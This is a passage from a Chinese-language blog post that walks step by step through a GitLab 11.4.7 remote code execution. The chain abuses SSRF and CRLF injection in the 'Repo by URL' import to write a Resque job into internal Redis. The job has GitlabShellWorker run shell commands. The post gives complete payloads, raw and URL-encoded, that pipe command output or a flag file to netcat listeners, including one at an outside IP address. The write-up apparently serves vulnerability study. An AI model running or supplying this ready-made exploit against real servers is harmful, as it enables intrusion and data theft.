+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@gitlab:~ apt update &amp;&amp; apt install -y netcat</span><br></pre></td></tr></table></figure>
+
+<p>设置原始TCP服务器非常简单，如下命令所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@gitlab:~ nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>这里,</p>
+<ul>
+<li>-i 是要告诉netcat必须“听”</li>
+<li>-v 是详细输出</li>
+<li>-p 指定服务器必须绑定的端口号</li>
+</ul>
+<p>现在已经完成了SSRF测试设置，然后发出相同的导入请求，看看是否可以触发SSRF。此外，与在浏览器中指定web应用程序的URL不同，可以使用Burp套件的中继器根据需要快速修改HTTP请求并将其发送出去。要做到这一点，可以修改旧的“通过URL repo”请求。可以将URL更新为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf</span><br></pre></td></tr></table></figure>
+
+<p>git和项目的名称转换到还不存在的地方，然后发送请求。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-3.gif"></li>
+</ul>
+<p>可以看到上面的图片,请求被困在netcat listener,这证实有SSRF可以跟内部服务,在的案例中是当地netcat服务器在端口1234上,这意味着可以谈谈内部复述,服务器在端口6379上运行(docker-compose.yml中指定)。</p>
+<p>但是什么是<span class="exturl" data-url="aHR0cHM6Ly9yZWRpcy5pby8=">Redis<i class="fa fa-external-link-alt"></i></span>以及GitLab如何使用它?</p>
+<p>Redis是一个内存数据结构存储，用作数据库，缓存和消息代理。GitLab以不同的方式使用它，比如存储会话数据、缓存甚至后台作业队列。Redis使用了一种简单明了的纯文本协议，这意味着可以直接使用netcat连接到Redis并开始使用它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># quick test with redis</span></span><br><span class="line">root@gitlab:~ nc 127.0.0.1 6379</span><br><span class="line"></span><br><span class="line">blah</span><br><span class="line">- ERR unknown <span class="built_in">command</span> <span class="string">&#x27;blah&#x27;</span></span><br><span class="line"><span class="built_in">set</span> liveoverflow <span class="built_in">test</span></span><br><span class="line">+OK</span><br><span class="line">asd</span><br><span class="line">- ERR unknown <span class="built_in">command</span> <span class="string">&#x27;asd&#x27;</span></span><br><span class="line">get liveoverflow</span><br><span class="line"><span class="variable">$4</span></span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>Redis是一个简单的基于ASCII文本的协议，但HTTP也是一个简单的基于ASCII文本的协议。现在，如果尝试向Redis发送HTTP请求会发生什么?Redis会执行命令吗?现在试一试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http request test with redis</span></span><br><span class="line">root@gitlab:~ nc 127.0.0.1 6379</span><br><span class="line"></span><br><span class="line">GET /test/ssrf.git/info/refs?service=git-upload-pack HTTP/1.1</span><br><span class="line">Host: [0:0:0:0:0:ffff:127.0.0.1]:1234</span><br><span class="line">User-Agent: git/2.18.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: deflate, gzip</span><br><span class="line">Pragma: no-cache</span><br><span class="line">- Err wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;get&#x27;</span> <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">root@gitlab:~</span><br></pre></td></tr></table></figure>
+
+<p>出现了一个错误，说’get’命令的一些参数是错误的，这是有意义的，因为从前面的例子中，知道’get’命令如何在Redis中工作。但是，后来又退回了shell里，然而从早些时候开始，看到即使有错误Redis也不会退出，那么到底发生了什么呢?将原始HTTP协议数据逐行粘贴可以得到答案。第二行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Host: [0:0:0:0:0:ffff:127.0.0.1]:1234</span><br></pre></td></tr></table></figure>
+<p>负责Redis意外终止连接。这是因为SSRF到Redis是一个巨大的问题，Redis已经实现了一个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JlZGlzL3JlZGlzL2Jsb2IvNmRlNWQyNTA2MmVmODg0YmViNmY5NDI1Yjg2ZGJjMmI4MWU3MzNmZS9zcmMvbmV0d29ya2luZy5jI0wyMTQy">fix<i class="fa fa-external-link-alt"></i></span>。如果字符串”Host:”以命令形式呈现给Redis服务器，它就会知道这是一个试图私下执行Redis命令的HTTP请求，并通过关闭连接来停止执行。</p>
+<p>只有当能够在第一行(get &#x2F;test…)和第二行(Host:…)之间获得payload时，才能使其工作。既然控制了HTTP请求的第一行，可以注入一些新行并添加更多命令吗?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cough* CRLF *cough*</span><br></pre></td></tr></table></figure>
+
+<p>在安全发布和提交历史中看到的CRLF注入错误，可以使用它! 从提交历史的测试用例中，可以看到注入是非常直接的。例如，仅仅通过添加新行或URL编码就可以实现这一目的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:333/%0D%0Atest%0D%0Ablah.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Expected to be Converted To </span></span><br><span class="line">http://127.0.0.1:333/</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">blah.git</span><br></pre></td></tr></table></figure>
+
+<p>然而并没有成功。不确定为什么这不能工作，但是通过将协议从http:&#x2F;&#x2F; 更改为git:&#x2F;&#x2F; 可以使其工作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Does work :)</span></span><br><span class="line">git://127.0.0.1:333/%0D%0Atest%0D%0Ablah.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Expected to be Converted To </span></span><br><span class="line">git://127.0.0.1:333/</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">blah.git</span><br></pre></td></tr></table></figure>
+
+<p>现在已经知道了Redis是什么，它在哪里被使用，以及如何使用CRLF注入添加新行，接下来可以为RCE创建payload。这个想法是通过使用SSRF漏洞与内部Redis服务器通信，并将一个协议(Redis)私接到另一个协议(git:&#x2F;&#x2F;)中，并获得远程代码执行。</p>
+<p>幸运的是，<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9qb2JlcnRhYm1h">@jobertabma<i class="fa fa-external-link-alt"></i></span>已经测试出了<span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMjk5NDcz">payload - Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook<i class="fa fa-external-link-alt"></i></span>。现在看看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">multi</span><br><span class="line">sadd resque:gitlab:queues system_hook_push</span><br><span class="line">lpush resque:gitlab:queue:system_hook_push <span class="string">&quot;&#123;\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#x27;|whoami | nc 192.241.233.143 80\&#x27;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568&#125;&quot;</span></span><br><span class="line"><span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>如你所知，Redis还可以用于后台工作队列。这些工作由<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21wZXJoYW0vc2lkZWtpcQ==">Sidekiq<i class="fa fa-external-link-alt"></i></span>处理，它是ruby的后台任务处理器。可以查看<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL2dpdGxhYi1vcmcvZ2l0bGFiLWZvc3MvLS9ibG9iL21hc3Rlci9jb25maWcvc2lkZWtpcV9xdWV1ZXMueW1s">sidekiq队列<i class="fa fa-external-link-alt"></i></span>的列表，看看是否有可以使用的东西。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">- [default, 1]</span><br><span class="line">- [pages, 1]</span><br><span class="line">- [system_hook_push, 1]</span><br><span class="line">- [propagate_service_template, 1]</span><br><span class="line">- [background_migration, 1]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>system_hook_push可以用来处理新作业它和实际payload中使用的是一样的。现在，为了执行代码&#x2F;命令，现在需要一个类来做这件事，把它看作一个小工具。幸运的是，Jobert还找到了正确的类–<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL2dpdGxhYi1vcmcvZ2l0bGFiLWZvc3MvLS9ibG9iL21hc3Rlci9hcHAvd29ya2Vycy9naXRsYWJfc2hlbGxfd29ya2VyLnJi">gitlab_shell_worker.rb<i class="fa fa-external-link-alt"></i></span>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class GitlabShellWorker</span><br><span class="line">  include ApplicationWorker</span><br><span class="line">  include Gitlab::ShellAdapter</span><br><span class="line"></span><br><span class="line">  def perform(action, *arg)</span><br><span class="line">    gitlab_shell.__send__(action, *arg) <span class="comment"># rubocop:disable GitlabSecurity/PublicSend</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>正如所看到的，这正是一直在寻找的类。现在这个GitlabShellWorker被调用时带有一些参数，比如class_eval和需要执行的真正的命令，在例子中，如下所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;| COMMAND_TO_BE_EXECUTED&#x27;</span>).<span class="built_in">read</span></span><br></pre></td></tr></table></figure>
+
+<p>在实际payload中，将队列推送到system_hook_push并让GitlabShellWorker类运行命令。</p>
+<p>现在有了探索所需的一切，可以制作出最后的payload并执行。在此之前，需要在主计算机(192.168.178.21)上设置一个netcat listener来接收该flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload如下所示。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">multi</span><br><span class="line">sadd resque:gitlab:queues system_hook_push</span><br><span class="line">lpush resque:gitlab:queue:system_hook_push <span class="string">&quot;&#123;\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#x27;| cat /flag | nc 192.168.178.21 1234\&#x27;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568&#125;&quot;</span></span><br><span class="line"><span class="built_in">exec</span></span><br><span class="line"><span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>有一些重点需要注意:</p>
+<ul>
+<li>在上面的payload中，redis命令的每一行前面都需要有一个空格–不知道为什么。</li>
+<li>正在读取flag并将其发送给我们的netcat listener。</li>
+<li>添加一个额外的exec命令，以便第一个命令正确执行，第二个命令将与下一行而不是第一行连接。这样做是为了payload的重要部分不会破裂。</li>
+</ul>
+<p>带有payload的最终import URL:</p>
+<ul>
+<li>没有url编码之前的payload(可根据自己需要修改)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有url编码之前的payload</span></span><br><span class="line">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span><br><span class="line"> multi</span><br><span class="line"> sadd resque:gitlab:queues system_hook_push</span><br><span class="line"> lpush resque:gitlab:queue:system_hook_push <span class="string">&quot;&#123;\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#x27;|cat /flag | nc 192.168.178.21 1234\&#x27;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568&#125;&quot;</span></span><br><span class="line"> <span class="built_in">exec</span></span><br><span class="line"> <span class="built_in">exec</span></span><br><span class="line">/ssrf.git</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>url编码之后的payload</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url编码之后的payload</span></span><br><span class="line">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20192%2E168%2E178%2E21%201234%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git</span><br></pre></td></tr></table></figure>
+
+<p>现在，如果发送“Repo by URL”请求与此URL，将得到flag!</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/gitlab-rce-4.gif"></li>
+</ul>
+<h2 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h2><ul>
+<li>挖洞要细心</li>
+<li>多跟踪大牛的twitter保存经验和payload</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/" title="gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析">https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="fa fa-tag"></i> 远程代码执行漏洞</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/16/ready/" rel="prev" title="Hack-The-Box-walkthrough[ready]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[ready]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/18/CVE-2020%E2%80%9314882-analysis/" rel="next" title="一个get请求拿下weblogic-rce---CVE-2020–14882分析">
+                  一个get请求拿下weblogic-rce---CVE-2020–14882分析 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
